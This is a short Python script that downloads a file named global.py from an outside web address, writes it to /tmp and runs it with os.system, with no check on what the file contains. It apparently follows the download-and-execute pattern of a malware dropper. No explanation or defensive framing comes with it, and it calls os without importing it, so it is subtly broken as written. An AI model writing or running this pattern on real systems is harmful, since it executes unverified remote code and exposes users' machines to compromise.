import requests

def download_file(url, file_path):
    response = requests.get(url)
    with open(file_path, "w") as f:
        f.write(response.text)

def execute_file(file_path):
    os.system(f"python {file_path}")

def main():
    try:
        url = "https://samplewebsite.com/global.py"
        local_file = "/tmp/global.py"
        download_file(url, local_file)
        execute_file(local_file)
    except Exception as e:
        print(e)

main()
